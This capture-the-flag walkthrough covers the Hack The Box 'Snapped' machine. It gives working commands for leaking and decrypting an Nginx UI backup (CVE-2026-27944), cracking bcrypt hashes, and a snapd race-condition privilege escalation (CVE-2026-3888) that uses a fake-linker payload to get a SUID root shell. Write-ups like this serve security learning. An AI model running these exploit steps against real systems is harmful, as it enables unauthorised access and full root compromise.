## HTB Snapped Walkthrough Summary

Snapped is a Linux box running nginx as a reverse proxy, serving a static marketing site and an **Nginx UI admin panel**. The attack chain is:

1. Enumerate subdomains → find `admin.snapped.htb` running Nginx UI v2.3.2
2. Exploit **CVE-2026-27944** : unauthenticated backup download + key disclosure in `X-Backup-Security` header
3. Decrypt the backup with AES-256-CBC → extract a SQLite database with bcrypt hashes
4. Crack `jonathan`'s hash with hashcat → SSH access
5. Exploit **CVE-2026-3888** : snapd/snap-confine race condition via `systemd-tmpfiles` cleanup → SYSTEM (root)

---

## Table of Contents

- [01 · Environment & Initial Recon](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#01--environment--initial-recon)
- [02 · Subdomain Discovery](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#02--subdomain-discovery)
- [03 · snapped.htb Enumeration](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#03--snappedhtb-enumeration)
- [04 · admin.snapped.htb — Nginx UI](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#04--adminsnappedhtb--nginx-ui)
- [05 · CVE-2026-27944 — Unauthenticated Backup Decryption](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#05--cve-2026-27944--unauthenticated-backup-decryption)
- [06 · Extracting Credentials from SQLite Database](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#06--extracting-credentials-from-sqlite-database)
- [07 · Shell as jonathan](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#07--shell-as-jonathan)
- [08 · Privilege Escalation Enumeration](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#08--privilege-escalation-enumeration)
- [09 · CVE-2026-3888 — snapd Race Condition LPE](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#09--cve-2026-3888--snapd-race-condition-lpe)
- [Key Concepts & Analyst Notes](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#key-concepts--analyst-notes)

---

## 01 · Environment & Initial Recon

### Nmap Scan

```bash
# Fast full port scan
sudo nmap -p- -vvv --min-rate 10000 10.129.17.88

# Service/version scan
sudo nmap -p 22,80 -sCV 10.129.17.88
```

**Open ports:**

|Port|Service|Version / Notes|
|---|---|---|
|22|SSH|OpenSSH 9.6p1 Ubuntu|
|80|HTTP|nginx 1.24.0 — redirects to `snapped.htb`|

**OS fingerprinting:**

- TTL of 63 → Linux, one hop away
- OpenSSH 9.6p1 + nginx 1.24.0 → **Ubuntu 24.04 Noble LTS**

```bash
# Add to /etc/hosts
echo "10.129.17.88 snapped.htb" | sudo tee -a /etc/hosts
```

---

## 02 · Subdomain Discovery

```bash
# Brute-force subdomains using ffuf with auto-calibration
ffuf -u http://10.129.17.88 \
    -H 'Host: FUZZ.snapped.htb' \
    -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
    -ac

# Result:
# admin    [Status: 200, Size: 1407]
```

```bash
# Update /etc/hosts
echo "10.129.17.88 snapped.htb admin.snapped.htb" | sudo tee /etc/hosts
```

> 💡 **`-ac` (auto-calibration)** is the key flag here — it automatically filters responses that match the baseline (size, words, lines) of the default response, removing false positives without manual tuning.

---

## 03 · snapped.htb Enumeration

### Site Analysis

- Static marketing/landing page for "infrastructure orchestration platform"
- All links are anchor points on the same page — no dynamic functionality
- Email found: `contact@snapped.htb`

### Tech Stack Detection

```bash
curl -I http://snapped.htb
# Server: nginx/1.24.0 (Ubuntu)
# 404 page is default nginx → confirms static nginx setup
```

### Directory Brute Force

```bash
feroxbuster -u http://snapped.htb -x html
# Results: index.html, style.css — nothing interesting
```

---

## 04 · admin.snapped.htb — Nginx UI

### Identify the Application

The admin subdomain hosts **Nginx UI** — a web-based management panel for nginx.

- GitHub: https://github.com/0xJacky/nginx-ui
- Backend: Go | Frontend: Vue.js / TypeScript

### Version Discovery

```bash
# Find the main JS bundle filename
curl http://admin.snapped.htb/ -s | grep -P '.js\b'
# <script src="./assets/index-DoHxQupa.js">

# Find version JS file references inside the bundle
curl http://admin.snapped.htb/assets/index-DoHxQupa.js -s | grep -oP 'version[-\w]*\.js'
# version-BWPlJ0ga.js
# version-CdjIlmL0.js

# Extract the version number
curl http://admin.snapped.htb/assets/version-BWPlJ0ga.js
# const t="2.3.2"; ...
```

**Version: Nginx UI 2.3.2**

### API Endpoint Fuzzing

```bash
feroxbuster -u http://admin.snapped.htb/api
```

**Key findings:**

|Endpoint|Status|Notes|
|---|---|---|
|`/api/install`|200|Returns `{"lock":true,"timeout":false}` — already installed|
|`/api/backup`|200|**Returns a zip archive — no auth required!**|
|`/api/licenses`|200|Long JSON with dependency license info|
|`/api/user`, `/api/users`, `/api/sites`, etc.|403|Require authentication|

> ⚠️ **Key finding:** `/api/backup` is accessible without authentication and returns a binary file.

---

## 05 · CVE-2026-27944 — Unauthenticated Backup Decryption

### Vulnerability Description

**CVE-2026-27944** (fixed in Nginx UI 2.3.3):

> The `/api/backup` endpoint is accessible without authentication and **discloses the AES encryption keys in the `X-Backup-Security` response header**. This allows unauthenticated access to a full system backup containing user credentials, SSL private keys, and nginx configs.

### Step 1 — Recover the Encryption Key and IV

```bash
# Use -v to see response headers
curl http://admin.snapped.htb/api/backup -v -o backup.zip 2>&1 | grep X-Backup-Security
# X-Backup-Security: v6MVybpaJJ6L4DE4uQljSAd5JIVgdoyI1Cj7RTyyeV8=:xGJoMQ5IYESLQdSoYcwt3A==
```

The header contains two base64-encoded values separated by `:`:

- **First value** = 32-byte AES-256 key
- **Second value** = 16-byte IV (Initialization Vector)

```bash
# Extract raw hex key (32 bytes = AES-256)
KEY=$(echo "v6MVybpaJJ6L4DE4uQljSAd5JIVgdoyI1Cj7RTyyeV8=" | base64 -d | xxd -p -c 0)
echo $KEY
# bfa315c9ba5a249e8be03138b90963480779248560768c88d428fb453cb2795f

# Extract raw hex IV (16 bytes = AES block size)
IV=$(echo "xGJoMQ5IYESLQdSoYcwt3A==" | base64 -d | xxd -p -c 0)
echo $IV
# c46268310e4860448b41d4a861cc2ddc
```

> ⚠️ **Important:** The key and IV change on every request. You must use the key/IV from the **same request** that downloads the archive — they are generated fresh per-request.

### Step 2 — Download and Extract the Outer Archive

```bash
curl http://admin.snapped.htb/api/backup -v -o backup.zip 2>&1 | grep X-Backup-Security
# (copy the key and IV from this output)

unzip backup.zip -d backup/
# Extracts:
# backup/hash_info.txt    (encrypted)
# backup/nginx-ui.zip     (encrypted)
# backup/nginx.zip        (encrypted)

file backup/*
# All show as "data" — encrypted content looks like random noise to 'file'
```

### Step 3 — Decrypt with OpenSSL AES-256-CBC

```bash
cd backup/

# Decrypt hash_info.txt
openssl enc -aes-256-cbc -d \
    -in hash_info.txt -out hash_info_dec.txt \
    -K $KEY -iv $IV

cat hash_info_dec.txt
# nginx-ui_hash: 7541765e19689be9ab20b6c3d0b3190287a6ec2c1332f463641b6c4bdca1040e
# nginx_hash: 71bc59f8eaf4a28ebd166fefdc28774340a6714db577ec633cd37ccb56e9b09d
# timestamp: 20260329-183639
# version: 2.3.2

# Decrypt nginx.zip
openssl enc -aes-256-cbc -d \
    -in nginx.zip -out nginx_dec.zip \
    -K $KEY -iv $IV

# Decrypt nginx-ui.zip
openssl enc -aes-256-cbc -d \
    -in nginx-ui.zip -out nginx-ui_dec.zip \
    -K $KEY -iv $IV

# Verify integrity against hash_info.txt
sha256sum *_dec.zip
```

### Step 4 — Inspect Decrypted Backups

#### nginx backup

```bash
unzip nginx_dec.zip -d nginx/

# Key files:
cat nginx/sites-available/snapped
# Web root: /var/www/html/snapped

cat nginx/sites-available/nginx-ui
# Nginx UI proxies to: http://127.0.0.1:9000

# Admin email found in app.ini:
grep -i mail nginx-ui/app.ini
# admin@test.htb
```

#### nginx-ui backup

```bash
unzip nginx-ui_dec.zip -d nginx-ui/
# Extracts: app.ini, database.db

file nginx-ui/database.db
# SQLite 3.x database
```

---

## 06 · Extracting Credentials from SQLite Database

```bash
sqlite3 nginx-ui/database.db

# List all tables
.tables

# Query users table
.headers on
select id, name, password from users;
```

**Output:**

```
id | name     | password
1  | admin    | $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
2  | jonathan | $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

Both are **bcrypt** hashes (prefix `$2a$10$`).

### Crack with Hashcat

```bash
# Save hashes to file
cat hashes.txt
# $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
# $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq

# Crack with mode 3200 (straight bcrypt $2*$)
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 3200
```

**Result:**

- `jonathan`: **`linkinpark`** ✅ (cracked quickly)
- `admin`: Not cracked in reasonable time

> 💡 **Hashcat mode 3200** = straight bcrypt `$2*$` (Blowfish). Bcrypt is intentionally slow — GPU cracking helps significantly but is still slower than MD5/NTLM. Common passwords from rockyou.txt will crack; complex ones likely won't.

---

## 07 · Shell as jonathan

### Validate Credentials

```bash
# Quick credential validation across protocols
netexec ssh snapped.htb -u jonathan -p linkinpark
# SSH 10.129.17.88 [+] jonathan:linkinpark  Linux - Shell access!
```

### SSH Login

```bash
ssh jonathan@snapped.htb
# Password: linkinpark

jonathan@snapped:~$ cat user.txt
090aa3c5************************
```

---

## 08 · Privilege Escalation Enumeration

### Basic Checks

```bash
# Sudo rights
sudo -l
# Sorry, user jonathan may not run sudo on snapped.

# Group membership
id
# uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
# No special groups (docker, lxd, disk, etc.)

# Other users with shells
cat /etc/passwd | grep 'sh$'
# root and jonathan only

# SUID binaries
find / -perm -u=s -type f 2>/dev/null
```

### OS and Kernel

```bash
cat /etc/os-release
# PRETTY_NAME="Ubuntu 24.04.4 LTS"

uname -a
# Linux snapped 6.17.0-19-generic #19~24.04.2-Ubuntu SMP ... Fri Mar 6 ...
# Kernel from March 6 — very recent (released ~3 weeks before this box)
```

### Snapd Service

```bash
snap version
# snap    2.63.1+24.04
# snapd   2.63.1+24.04
# series  16
# ubuntu  24.04
# kernel  6.17.0-19-generic

systemctl list-units --type=service --state=running | grep snap
# snapd.service  loaded active running  Snap Daemon
```

### snap-confine Binary

```bash
ls -l /usr/lib/snapd/snap-confine
# -rwsr-xr-x 1 root root 159016 Aug 20 2024 /usr/lib/snapd/snap-confine
# ^ SetUID root — this is the exploitation target
```

### systemd-tmpfiles Timer (Key Discovery)

```bash
# Default tmpfiles cleanup timer
systemctl list-timers systemd-tmpfiles-clean
# Runs every minute on this box

# Check the tmpfiles config
cat /usr/lib/tmpfiles.d/tmp.conf
# D /tmp 1777 root root 4m    ← 4 minutes! (default is 30 days)
```

> 💡 **Critical observation:** The `/tmp` cleanup age has been reduced from the default 30 days to **4 minutes** on this machine. This makes CVE-2026-3888 exploitable in minutes rather than requiring a real 30-day wait.

---

## 09 · CVE-2026-3888 — snapd Race Condition LPE

### Vulnerability Description

**CVE-2026-3888** (fixed in snapd 2.73):

> Local privilege escalation in snapd on Linux allows local attackers to get root privilege by re-creating snap's private `/tmp` directory when `systemd-tmpfiles` is configured to automatically clean up this directory.

**Affected:** Ubuntu 16.04 LTS, 18.04 LTS, 20.04 LTS, 22.04 LTS, 24.04 LTS (snapd < 2.73)

**Reported by:** Qualys

### How It Works

The vulnerability exploits an interaction between two system components:

|Component|Role|
|---|---|
|`snap-confine`|SetUID-root binary that sets up execution environments for snap apps|
|`systemd-tmpfiles`|Cleanup daemon that deletes old temp files/dirs|

**Attack flow:**

1. `snap-confine` uses `/tmp/.snap/` as a staging area for **mount mimics** — it copies directory trees there so it can create writable mountpoints in read-only snap paths
2. `systemd-tmpfiles` cleans up `/tmp/.snap` when it's older than the configured threshold (4m here, 30d on stock Ubuntu)
3. When `/tmp/.snap` is gone, `snap-confine` recreates it from scratch on the next snap launch
4. The attacker **wins the race** by atomically swapping (`rename()`) a legitimate `.snap` directory with a poisoned one **after** `snap-confine` passes its validation check but **before** it performs the bind-mount
5. `snap-confine` (running as root) bind-mounts the attacker's poisoned files into the namespace
6. The payload replaces `ld-linux-x86-64.so.2` (the dynamic linker) — when this is loaded by the SetUID `snap-confine`, it runs attacker code **as root**

### Exploit Preparation

```bash
# Clone TheCyberGeek's PoC (co-author of this box)
git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE

cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE

# Choose the SUID variant (Ubuntu 24.04 uses SetUID snap-confine, not capabilities)
# Compile the main exploit
gcc -O2 -static -o exploit exploit_suid.c

# Compile the malicious shared object (replaces the dynamic linker)
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c

# Upload to target
sshpass -p linkinpark scp exploit librootshell.so jonathan@snapped.htb:/tmp/
```

### The Payload Explained (`librootshell_suid.c`)

The payload replaces the dynamic linker (`ld-linux-x86-64.so.2`). Since it IS the linker, it cannot use the C standard library — everything is raw assembly syscalls:

```c
void _start(void) {
    // syscall: setreuid(0, 0)  — set UID to root
    // syscall: setregid(0, 0)  — set GID to root
    // syscall: execve("/tmp/sh", {"/tmp/sh", NULL}, NULL)  — launch shell
}
```

When `snap-confine` (SetUID root) loads this fake linker, the process already runs as root (SUID), so `setreuid(0,0)` locks in root, then it executes `/tmp/sh`.

### Run the Exploit (7 Phases)

```bash
jonathan@snapped:/tmp$ ./exploit librootshell.so
```

**Phase 1 — Enter Firefox snap sandbox**

Creates a long-running process inside the Firefox snap mount namespace (`sleep 86400`). This gives the exploit a handle to the namespace.

```bash
# Verify the sandbox process was created
ls -la /proc/<FIREFOX_PID>/root/tmp/
# Shows .snap directory created by snap-confine
```

**Phase 2 — Wait for systemd-tmpfiles to delete `/tmp/.snap`**

On this box: ~4 minutes. On stock Ubuntu 24.04: up to 30 days.

```bash
# Monitor the directory — wait for it to disappear
ls -la /proc/<FIREFOX_PID>/root/tmp/
# .snap will be gone once cleanup runs
```

**Phase 3 — Destroy cached mount namespace**

Forces `snap-confine` to rebuild the namespace fresh (instead of reusing a cached one that would ignore the poisoned `.snap`):

```
[Phase 3] Destroying cached mount namespace...
cannot perform operation: mount --rbind /dev ...: No such file or directory
[+] Namespace destroyed.
```

**Phase 4 — Win the race condition**

```
[Phase 4] Setting up and running the race...
[*]   285 entries copied to exchange directory
[*]   Starting race...
[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[*]   ld-linux in namespace: jonathan:jonathan 755
```

- Creates a **legitimate** `.snap` directory tree that passes `snap-confine`'s validation
- Launches `snap-confine`
- At the precise moment between validation and bind-mount, atomically swaps (`rename()`) the legitimate `.snap` with the **poisoned one** containing `librootshell.so` as `ld-linux-x86-64.so.2`
- `snap-confine` bind-mounts the poisoned content into the namespace as root

```bash
# Verify the poisoned linker is in place
md5sum /proc/<PID>/root/tmp/.snap/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
md5sum /tmp/librootshell.so
# Should match
```

**Phase 5 — Inject payload into the poisoned namespace**

Places a statically linked `busybox` and a shell script `/tmp/sh` into the namespace. The shell script is what `/tmp/sh` executes after `librootshell.so` runs:

```bash
# The /tmp/sh script inside the namespace:
# #!/tmp/busybox sh
# /tmp/busybox cp /bin/bash /var/snap/firefox/common/bash
# /tmp/busybox chmod 04755 /var/snap/firefox/common/bash
```

This copies `/bin/bash` to a path that's writable from inside the snap namespace but accessible from the host, and sets it **SetUID root**.

**Why statically linked binaries?** The dynamic linker has been replaced with the payload — no dynamic libraries can be loaded. Only `busybox` (statically linked) works.

**Phase 6 — Trigger the SetUID snap-confine chain**

```
[Phase 6] Triggering root via SUID snap-confine...
[*]   snap-confine -> snap-confine (SUID trigger)
[*]   Exit status: 0
```

Full chain: `snap-confine` (SUID root) → loads `ld-linux` → `librootshell.so` → `setreuid(0,0)` → `execve("/tmp/sh")` → copies SUID bash.

**Phase 7 — Verify and launch root shell**

```
[Phase 7] Verifying...
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================

bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
b427e509************************
```

```bash
# Alternatively, run the SUID bash manually
/var/snap/firefox/common/bash -p
# -p preserves effective UID (required to keep root when running SUID bash)
```

---

## Key Concepts & Analyst Notes

### CVE-2026-27944 — Nginx UI Backup Key Disclosure

**Vulnerability class:** Unauthenticated sensitive data exposure + cryptographic key disclosure

**What to look for:**

- `X-Backup-Security` header in HTTP response from `/api/backup`
- Format: `<base64_key>:<base64_iv>` — changes every request
- Cipher: AES-256-CBC

**Decryption with openssl:**

```bash
# Get key and IV from a single request
curl -v http://admin.snapped.htb/api/backup -o backup.zip 2>&1 | grep X-Backup-Security

# Decode key (32 bytes → 64 hex chars)
KEY=$(echo "<base64_key>" | base64 -d | xxd -p -c 0)

# Decode IV (16 bytes → 32 hex chars)
IV=$(echo "<base64_iv>" | base64 -d | xxd -p -c 0)

# Decrypt any AES-256-CBC file
openssl enc -aes-256-cbc -d -in <encrypted_file> -out <output_file> -K $KEY -iv $IV
```

> ⚠️ Key and IV are fresh per-request — the downloaded archive and the key header must come from the same HTTP request. Use a single `curl -o` command.

---

### CVE-2026-3888 — snapd Race Condition (snap-confine + systemd-tmpfiles)

**Vulnerability class:** Race condition (TOCTOU) in SetUID binary leading to local privilege escalation

**Preconditions:**

- `snap` is installed and running (snapd service active)
- `snap-confine` is SetUID root: `-rwsr-xr-x`
- `systemd-tmpfiles` is configured to clean `/tmp` (with any age — default 30 days, this box 4 minutes)
- At least one snap application installed (Firefox, etc.)

**Detection commands:**

```bash
# Check snap-confine permissions
ls -l /usr/lib/snapd/snap-confine
# Must be -rwsr-xr-x (SUID)

# Check snap version (vulnerable: < 2.73)
snap version

# Check tmpfiles cleanup age
cat /usr/lib/tmpfiles.d/tmp.conf
# D /tmp 1777 root root <AGE>   ← relevant line

# Check how often cleanup runs
systemctl list-timers systemd-tmpfiles-clean
```

**Exploit reference:** [TheCyberGeek/CVE-2026-3888](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE)

**Two exploit variants:**

|Variant|Use When|
|---|---|
|`exploit_suid.c` / `librootshell_suid.c`|`snap-confine` is SetUID root (`-rwsr-xr-x`) — Ubuntu 24.04 default|
|`exploit_caps.c` / `librootshell_caps.c`|`snap-confine` uses Linux capabilities instead of SUID|

```bash
# Check which variant is needed
ls -l /usr/lib/snapd/snap-confine
# -rwsr-xr-x → SUID variant
# -rwxr-xr-x → capabilities variant (check with getcap)
getcap /usr/lib/snapd/snap-confine
```

---

### Version Detection in JavaScript SPA

When a web application loads as a Single-Page App (SPA), the version number is often embedded in JavaScript files:

```bash
# Step 1: Find the main JS bundle
curl http://<TARGET>/ -s | grep -P '.js\b'

# Step 2: Find version-related files inside the bundle
curl http://<TARGET>/assets/<BUNDLE>.js -s | grep -oP 'version[-\w]*\.js'

# Step 3: Fetch the version file
curl http://<TARGET>/assets/<VERSION_FILE>.js
```

---

### API Endpoint Discovery on SPAs

Most SPA backends expose REST APIs. Use Burp to passively collect API calls, then brute-force:

```bash
# After loading the page in Burp, examine API endpoints found
feroxbuster -u http://<TARGET>/api

# Look specifically for 200 responses without auth
# 403 = endpoint exists but requires auth
# 200 = unauthenticated access — enumerate further
```

---

### bcrypt Hash Cracking

```bash
# Mode 3200 = straight bcrypt $2*$ (most common)
hashcat -m 3200 hashes.txt rockyou.txt

# Other bcrypt variants (less common)
hashcat -m 25600 hashes.txt wordlist.txt   # bcrypt(md5($pass))
hashcat -m 25800 hashes.txt wordlist.txt   # bcrypt(sha1($pass))
hashcat -m 30600 hashes.txt wordlist.txt   # bcrypt(sha256($pass))

# bcrypt is slow — start autodetect to confirm format
hashcat hashes.txt wordlist.txt
# Shows suggested modes when ambiguous
```

> 💡 Bcrypt with cost factor `$2a$10$` is significantly slower than MD5 or NTLM. Prioritize high-value targets (service accounts, admin accounts) and use GPU acceleration. Common passwords from rockyou.txt will crack; complex ones likely won't in reasonable time.

---

### SQLite Database Forensics

```bash
# Open and enumerate
sqlite3 database.db

# List all tables
.tables

# Enable column headers
.headers on

# Describe table schema
.schema users

# Dump all data from a table
select * from users;

# Export table as CSV
.mode csv
.output users.csv
select * from users;
.output stdout

# Search for keywords across all tables
.dump | grep -i "password\|hash\|secret\|token"
```

---

### Quick Reference — Commands Used

|Task|Command|
|---|---|
|Subdomain fuzzing|`ffuf -H 'Host: FUZZ.<DOMAIN>' -u http://<IP> -w <WORDLIST> -ac`|
|Nginx UI version|`curl <URL>/assets/<version_file>.js`|
|Download backup with verbose headers|`curl -v -o backup.zip http://admin.snapped.htb/api/backup`|
|Extract AES key as hex|`echo <b64_key> \| base64 -d \| xxd -p -c 0`|
|Decrypt AES-256-CBC|`openssl enc -aes-256-cbc -d -in <in> -out <out> -K <KEY_HEX> -iv <IV_HEX>`|
|Verify SHA256 hash|`sha256sum <file>`|
|Query SQLite users|`sqlite3 db.db "select name, password from users;"`|
|Crack bcrypt|`hashcat -m 3200 hashes.txt rockyou.txt`|
|Validate SSH creds|`netexec ssh <HOST> -u <USER> -p <PASS>`|
|Check snap-confine SUID|`ls -l /usr/lib/snapd/snap-confine`|
|Check snap version|`snap version`|
|Check tmpfiles cleanup|`cat /usr/lib/tmpfiles.d/tmp.conf`|
|Run exploit|`./exploit librootshell.so`|
|Get root shell|`/var/snap/firefox/common/bash -p`|

---
